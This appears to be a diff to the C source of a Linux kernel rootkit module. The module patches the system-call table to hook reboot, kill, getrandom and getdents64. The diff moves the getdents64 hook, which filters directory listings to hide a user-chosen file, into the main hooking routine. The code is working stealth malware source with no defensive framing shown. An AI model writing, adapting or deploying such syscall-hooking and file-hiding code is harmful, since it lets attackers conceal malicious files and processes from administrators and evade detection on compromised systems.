@@ -84,6 +84,48 @@ long kill_hook(const struct pt_regs *regs)
 		return sys_kill_orig(regs);
 }
 
+long getdents64_hook(const struct pt_regs *regs)
+{
+	long ret = 0;
+	struct linux_dirent64 *filter_dirent;
+	char __user *usr_buf, *buf;
+	char *out_buf;
+	size_t buf_offset = 0, out_buf_offset = 0;
+
+	ret = sys_getdents64_orig(regs);
+	if (ret <= 0)
+		return ret;
+	buf = kmalloc(ret, GFP_KERNEL);
+	out_buf = kmalloc(ret, GFP_KERNEL);
+	if (!buf || !out_buf) {
+		ret = -ENOMEM;
+		goto free_buf;
+	}
+	usr_buf = (char *)regs->regs[1];
+	if (copy_from_user(buf, usr_buf, ret))
+		return -EFAULT;
+	while (buf_offset < ret) {
+		filter_dirent = (struct linux_dirent64 *)(buf + buf_offset);
+		if (strcmp(hided_file.name, filter_dirent->d_name)) {
+			memcpy(out_buf+out_buf_offset,
+			       buf+buf_offset, filter_dirent->d_reclen);
+			out_buf_offset += filter_dirent->d_reclen;
+		}
+		buf_offset += filter_dirent->d_reclen;
+	}
+	if (copy_to_user(usr_buf, out_buf, out_buf_offset)) {
+		ret = -EFAULT;
+		goto free_buf;
+	}
+	ret = out_buf_offset;
+free_buf:
+	if (buf)
+		kfree(buf);
+	if (out_buf)
+		kfree(out_buf);
+	return ret;
+}
+
 long getrandom_hook(const struct pt_regs *regs)
 {
 	char __user *buf = (char *)regs->regs[0];
@@ -100,13 +142,14 @@ long getrandom_hook(const struct pt_regs *regs)
 	return count;
 }
 
-#define SYSCALL_HOOK_NUM 3
+#define SYSCALL_HOOK_NUM 4
 static int hook_syscall(unsigned long arg)
 {
 	int ret = 0;
 	int syscall_nr_arr[SYSCALL_HOOK_NUM] = {
 		__NR_reboot,
 		__NR_kill,
+		__NR_getdents64,
 		__NR_getrandom,
 	};
 	syscall_fn_t hook_arr[SYSCALL_HOOK_NUM];
@@ -114,11 +157,13 @@ static int hook_syscall(unsigned long arg)
 	if (sys_call_table_ptr[__NR_reboot] == sys_reboot_orig) {
 		hook_arr[0] = reboot_hook;
 		hook_arr[1] = kill_hook;
-		hook_arr[2] = getrandom_hook;
+		hook_arr[2] = getdents64_hook;
+		hook_arr[3] = getrandom_hook;
 	} else {
 		hook_arr[0] = sys_reboot_orig;
 		hook_arr[1] = sys_kill_orig;
-		hook_arr[2] = sys_getrandom_orig;
+		hook_arr[2] = sys_getdents64_orig;
+		hook_arr[3] = sys_getrandom_orig;
 	}
 	modify_syscall_table(hook_arr, syscall_nr_arr, SYSCALL_HOOK_NUM);
 
@@ -185,58 +230,13 @@ struct getdents_callback64 {
 	int error;
 };
 
-long getdents64_hook(const struct pt_regs *regs)
-{
-	long ret = 0;
-	struct linux_dirent64 *filter_dirent;
-	char __user *usr_buf, *buf;
-	char *out_buf;
-	size_t buf_offset = 0, out_buf_offset = 0;
-
-	ret = sys_getdents64_orig(regs);
-	if (ret <= 0)
-		return ret;
-	buf = kmalloc(ret, GFP_KERNEL);
-	out_buf = kmalloc(ret, GFP_KERNEL);
-	if (!buf || !out_buf) {
-		ret = -ENOMEM;
-		goto free_buf;
-	}
-	usr_buf = (char *)regs->regs[1];
-	if (copy_from_user(buf, usr_buf, ret))
-		return -EFAULT;
-	while (buf_offset < ret) {
-		filter_dirent = (struct linux_dirent64 *)(buf + buf_offset);
-		if (strcmp(hided_file.name, filter_dirent->d_name)) {
-			memcpy(out_buf+out_buf_offset,
-			       buf+buf_offset, filter_dirent->d_reclen);
-			out_buf_offset += filter_dirent->d_reclen;
-		}
-		buf_offset += filter_dirent->d_reclen;
-	}
-	if (copy_to_user(usr_buf, out_buf, out_buf_offset)) {
-		ret = -EFAULT;
-		goto free_buf;
-	}
-	ret = out_buf_offset;
-free_buf:
-	if (buf)
-		kfree(buf);
-	if (out_buf)
-		kfree(out_buf);
-	return ret;
-}
-
 static int hide_file(unsigned long arg)
 {
 	int ret = 0;
 	struct hided_file __user *usr_arg = (struct hided_file *)arg;
-	syscall_fn_t hook_arr[1] = { getdents64_hook };
-	int syscall_nr_arr[1] = { __NR_getdents64 };
 
 	if (copy_from_user(&hided_file, usr_arg, sizeof(hided_file)))
 		return -EFAULT;
-	modify_syscall_table(hook_arr, syscall_nr_arr, 1);
 	return ret;
 }
 
